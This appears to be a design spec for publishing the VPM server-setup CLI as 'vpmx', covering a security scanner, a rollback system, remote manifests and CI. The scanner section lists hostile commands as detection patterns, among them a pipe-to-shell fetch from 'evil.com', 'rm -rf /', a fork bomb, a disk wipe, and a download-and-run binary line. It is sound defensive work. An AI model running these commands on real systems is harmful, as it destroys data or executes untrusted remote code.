# VPMX Public Release — Design Spec

> **Goal:** Transform VPM from a private VPS helper into a publish-worthy, open-source CLI tool on PyPI — with security scanning, rollback support, remote manifests, AI agent integration, and a path toward a community manifest registry.

**Architecture:** Extend the existing modular Python package (zero external deps constraint preserved) with new modules for security scanning and rollback. Add CI/CD, examples, and AI agent context files. PyPI package name: `vpmx`, CLI command stays `vpm`.

**Tech Stack:** Python 3.10+ stdlib only. GitHub Actions for CI/CD. PyPI for distribution.

---

## 1. PyPI Rename & Metadata

### Problem

`vpm` is taken on PyPI (Verilog package manager, 2016). `vpm-cli` is also taken. Need a new PyPI name while keeping the `vpm` CLI command users already know.

### Decision

- **PyPI package name:** `vpmx` (available, short, keeps brand)
- **CLI command:** stays `vpm` (via `[project.scripts]`)
- **Internal package directory:** stays `vpm/` (no code rename needed)

### Changes

- `pyproject.toml`: `name = "vpmx"`, bump version to `1.1.0`
- Add author email, changelog URL, blog URL (matching gtrends-cli conventions)
- Expand keywords for discoverability
- Add `Topic :: Utilities` classifier
- `__init__.py`: update `__app_name__` comment to note PyPI vs CLI distinction
- `README.md`: update install instructions to `pip install vpmx` / `pipx install vpmx`
- `upgrade.sh`: update to reference `vpmx` for pipx commands

---

## 2. Security Scanner

### Problem

VPM executes arbitrary shell commands from manifest files. A user downloading a third-party manifest could unknowingly run `curl evil.com/payload | bash` or `rm -rf /`. There's zero validation today.

### Design

New module: `vpm/scanner.py`

#### 2.1 Static Pattern Detection

A `SecurityScanner` class that analyzes manifest commands before execution. Patterns organized by severity:

**CRITICAL (block by default):**
- `rm -rf /` or `rm -rf /*` (system wipe)
- `:(){ :|:& };:` (fork bomb)
- `mkfs` on system devices
- `dd if=/dev/zero of=/dev/sda` (disk wipe)
- `chmod -R 777 /` (global permission nuke)

**HIGH (warn by default):**
- `curl ... | bash`, `wget ... | sh`, `curl ... | python` (pipe-to-shell from URL)
- `eval` with variable expansion
- `chmod 777` (overly permissive)
- Writing to `/etc/passwd`, `/etc/shadow`, `/etc/sudoers` directly
- `--no-check-certificate`, `--insecure` flags
- Downloading and executing binaries from URLs

**MEDIUM (info by default):**
- Any `curl`/`wget` downloading executables
- `sudo` without `-y` (might hang in non-interactive)
- Adding PPAs or third-party repos
- Modifying system crontab
- `git clone` from non-HTTPS URLs

**LOW (silent by default):**
- Using `sudo` at all (expected but worth noting)
- Modifying dotfiles
- Installing from package managers

#### 2.2 URL Extraction & Checking

Extract all URLs from commands. Optionally check against:
- **VirusTotal API** (if user provides API key in config)
- **Google Safe Browsing API** (if user provides API key)
- Basic heuristics: IP-only URLs, non-HTTPS, suspicious TLDs, URL shorteners

URL checking is opt-in (requires API keys). Static pattern detection is always on.

#### 2.3 Configuration

In `~/.config/vpm/config.json`:

```json
{
  "security": {
    "level": "warn",
    "check_urls": false,
    "virustotal_api_key": null,
    "allowed_domains": ["github.com", "download.docker.com"],
    "custom_rules": []
  }
}
```

`level` values:
- `"strict"` — block CRITICAL+HIGH, warn MEDIUM
- `"warn"` (default) — warn on everything, block CRITICAL only
- `"permissive"` — warn on CRITICAL+HIGH only, allow rest
- `"off"` — disable scanning entirely

#### 2.4 New CLI Commands

**`vpm audit <manifest>`** — Scan a manifest without executing. Shows all findings with severity, line numbers, and explanations. Exit code 0 = clean, 1 = findings.

**Integration with `vpm install`:** Scanner runs automatically before execution. Based on `level`:
- Blocked findings → refuse to run, show findings, suggest `--skip-security` to override
- Warned findings → show findings, prompt user to continue (auto-yes with `--yes`)
- Info findings → show in `--dry-run` output only

**`--skip-security` flag** on `vpm install` — bypass scanner (with a warning that this is unsafe).

#### 2.5 Output Format

```
⚠  Security Scan Results
───────────────────────────────────────

[docker] Step 2: Add Docker GPG key
  ⚠ HIGH: Pipe-to-shell pattern detected
    curl -fsSL ... | sudo gpg --dearmor
    → Downloaded content is piped directly to a privileged command
    → Verify the URL is trusted: https://download.docker.com/linux/ubuntu/gpg

[custom_app] Step 3: Install binary
  ✖ CRITICAL: Downloading and executing unknown binary
    curl -o /tmp/app https://sketchy-site.xyz/app && chmod +x /tmp/app && /tmp/app
    → Binary from unverified source executed with user privileges

Summary: 0 critical, 1 high, 0 medium — Proceed? [y/N]
```

---

## 3. Rollback System

### Problem

If step 3 of 5 fails, the system is in a partially-modified state. Today, the user must manually undo changes. There's no structured way to define or execute undo actions.

### Design

#### 3.1 Manifest Format Extension

Add optional `rollback:` field per step:

```yaml
[nginx]
- label: Install Nginx
  run: sudo apt-get install -y nginx
  rollback: sudo apt-get remove -y nginx

- label: Configure Nginx
  run: sudo cp $HOME/nginx.conf /etc/nginx/nginx.conf
  rollback: sudo rm -f /etc/nginx/nginx.conf

- label: Enable Nginx
  run: |
    sudo systemctl enable nginx
    sudo systemctl start nginx
  rollback: |
    sudo systemctl stop nginx
    sudo systemctl disable nginx
```

Multi-line rollback uses the same `|` syntax as `run:`.

#### 3.2 Rollback Command

**`vpm rollback <app>`** — Runs rollback commands in reverse order for steps that have `status: success` and have a `rollback:` defined.

Behavior:
- Only rolls back steps that actually succeeded (not pending/skipped/failed)
- Runs in reverse order (last succeeded step first)
- Steps without `rollback:` are skipped with a warning
- Each rollback step is logged separately
- Rollback state tracked in lock file (`rollback_status` field on StepRecord)
- After rollback, app status becomes `"rolled_back"`

#### 3.3 Model Changes

`StepRecord` gets:
- `rollback_command: str | None` — the rollback command from manifest
- `rollback_status: str | None` — pending/success/failed/skipped
- `rollback_log_file: str | None`

`AppStatus` gets new value: `ROLLED_BACK = "rolled_back"`

`StepStatus` gets new value: `ROLLED_BACK = "rolled_back"` (for the original step after rollback succeeds)

#### 3.4 Parser Changes

`ManifestParser` recognizes `rollback:` as a step-level key (same as `label:` and `run:`), including `rollback: |` for multi-line.

`ManifestApp` steps dict gains `"rollback"` key.

#### 3.5 Safeguards

- Rollback commands go through the security scanner too
- `vpm rollback` prompts for confirmation (shows what will be undone)
- `--dry-run` support on rollback
- If a rollback step fails, continue with remaining rollbacks (don't stop — best-effort)

---

## 4. Remote Manifests

### Problem

You want sites/projects to provide VPM manifest files that users can run directly. Today, users must manually download the manifest first.

### Design

#### 4.1 `vpm run <source>`

New command that fetches and executes a manifest from a remote source:

```bash
vpm run https://example.com/setup.yaml
vpm run github:user/repo                    # fetches vpm-manifest.yaml from repo root
vpm run github:user/repo/path/manifest.yaml # specific file
vpm run ./local-file.yaml                   # also works for local (alias for install --file)
```

Behavior:
1. Fetch manifest to a temp file
2. Run security scanner on it (mandatory, cannot be skipped for remote manifests)
3. Show scan results + manifest summary (apps, steps count)
4. Prompt user to proceed
5. Execute via normal `vpm install` flow

#### 4.2 GitHub Shorthand

`github:user/repo` resolves to `https://raw.githubusercontent.com/user/repo/main/vpm-manifest.yaml`

Falls back to `master` branch if `main` doesn't exist.

#### 4.3 Fetching

Use `urllib.request` (stdlib) — no external deps. Handles HTTPS, redirects, basic error handling. Timeout of 30 seconds.

---

## 5. AI Agent Context File

### Problem

AI agents (Claude, GPT, Copilot, etc.) need a concise reference to generate correct VPM manifests and use the CLI properly. The README is 37KB — too long for agent context windows.

### Design

Create `AGENTS.md` at repo root (~300 lines). Contains:

1. **What VPM is** (2 sentences)
2. **Installation** (`pip install vpmx`, then `vpm doctor`)
3. **Manifest format** (condensed rules with examples)
4. **CLI reference** (all commands with flags, one-liner each)
5. **Manifest writing rules** (the 13 rules from README, condensed)
6. **Common patterns** (repo+install, binary download, docker compose)
7. **Anti-patterns** (the key DON'Ts)

Also create `llms.txt` at repo root (even more condensed, ~50 lines) for tools that use that convention.

---

## 6. Example Manifests

### Problem

No real-world examples beyond the template. Users and AI agents need reference manifests.

### Design

Create `examples/` directory with:

| File | Description |
|------|-------------|
| `docker.yaml` | Docker Engine + Compose on Ubuntu/Debian |
| `node-server.yaml` | Node.js (NVM) + PM2 + Nginx reverse proxy |
| `security-hardening.yaml` | UFW + fail2ban + SSH hardening + auto-updates |
| `dev-environment.yaml` | Git + Python + Node + Rust + common dev tools |
| `lamp-stack.yaml` | Apache + MySQL + PHP on Ubuntu |

Each manifest includes:
- Header comment with description, target OS, prerequisites
- Proper dependency chains
- Verification steps
- Rollback commands (showcasing the new feature)
- Comments explaining non-obvious choices

---

## 7. CI/CD & PyPI Publishing

### Design

#### 7.1 GitHub Actions: CI

`.github/workflows/ci.yml`:
- Trigger: push to `main`, PRs
- Matrix: Python 3.10, 3.11, 3.12, 3.13 on `ubuntu-latest`
- Steps: checkout, setup-python, `python -m py_compile vpm/*.py` (syntax check), run tests (once they exist)
- Lint: `ruff check` (add as dev dependency or run via pipx in CI)

#### 7.2 GitHub Actions: Publish

`.github/workflows/publish.yml`:
- Trigger: push tag `v*`
- Steps: build with `python -m build`, publish to PyPI via `twine` using trusted publisher (OIDC)
- Requires one-time PyPI trusted publisher setup

#### 7.3 Version Bumping

Keep manual for now (edit `pyproject.toml` + `__init__.py`). Can automate later.

---

## 8. Changelog

Create `CHANGELOG.md` following Keep a Changelog format:

```markdown
# Changelog

## [1.1.0] - 2026-04-XX

### Added
- Security scanner (`vpm audit`, auto-scan on install)
- Rollback system (`rollback:` in manifests, `vpm rollback` command)
- Remote manifest execution (`vpm run <url>`)
- AI agent context files (AGENTS.md, llms.txt)
- Example manifests for common setups
- CI/CD with GitHub Actions
- PyPI publishing as `vpmx`

### Changed
- PyPI package renamed from `vpm` to `vpmx` (CLI command unchanged)
- Version bumped to 1.1.0

## [1.0.0] - 2026-03-17

### Added
- Initial release
- Manifest parser with custom format
- PTY-based interactive execution
- Dependency resolution with topological sort
- Crash recovery via atomic lock file
- Change detection via SHA-256 hashing
- Shell completions (zsh, bash, fish)
- Self-diagnostics (`vpm doctor`)
```

---

## 9. README Updates

- Install section: `pip install vpmx` / `pipx install vpmx`
- Add Security Scanner section
- Add Rollback section
- Add Remote Manifests section
- Add link to AGENTS.md
- Add link to examples/
- Update architecture diagram to include scanner module

---

## 10. File Structure (After All Changes)

```
vpm/
├── vpm/
│   ├── __init__.py
│   ├── __main__.py
│   ├── style.py
│   ├── ui.py
│   ├── config.py
│   ├── models.py          # + rollback fields, ROLLED_BACK status
│   ├── lockfile.py
│   ├── manifest.py         # + rollback: parsing
│   ├── scanner.py          # NEW — security scanning
│   ├── executor.py         # + pre-install scan integration
│   ├── completions.py      # + audit, run, rollback completions
│   ├── app.py              # + cmd_audit, cmd_run, cmd_rollback
│   └── cli.py              # + audit, run, rollback subcommands
├── examples/
│   ├── docker.yaml
│   ├── node-server.yaml
│   ├── security-hardening.yaml
│   ├── dev-environment.yaml
│   └── lamp-stack.yaml
├── .github/
│   └── workflows/
│       ├── ci.yml
│       └── publish.yml
├── tests/                   # NEW — unit tests
│   ├── test_manifest.py
│   ├── test_models.py
│   ├── test_scanner.py
│   └── test_resolver.py
├── AGENTS.md                # NEW
├── llms.txt                 # NEW
├── CHANGELOG.md             # NEW
├── CONTRIBUTING.md          # updated
├── README.md                # updated
├── pyproject.toml           # updated
├── LICENSE
└── upgrade.sh               # updated
```

---

## Implementation Order

1. **PyPI rename + metadata** (pyproject.toml, __init__.py, README install section)
2. **CHANGELOG.md**
3. **Security scanner** (scanner.py, integration into executor/app/cli)
4. **Rollback system** (models, manifest parser, executor, app, cli)
5. **Remote manifests** (`vpm run`, URL fetching)
6. **AGENTS.md + llms.txt**
7. **Example manifests**
8. **CI/CD workflows**
9. **Tests** (manifest parser, models, scanner, resolver)
10. **README updates** (new sections, install instructions)
11. **Shell completions update** (new commands)
12. **CONTRIBUTING.md update**

---

## Out of Scope (Future)

- Manifest registry website (Phase 2 — deploy to microk8s cluster)
- `vpm import` (convert docker-compose/shell scripts to manifests)
- `vpm export` (export as standalone shell script)
- Hooks system (pre/post install)
- Plugin system
- Config file for per-project settings
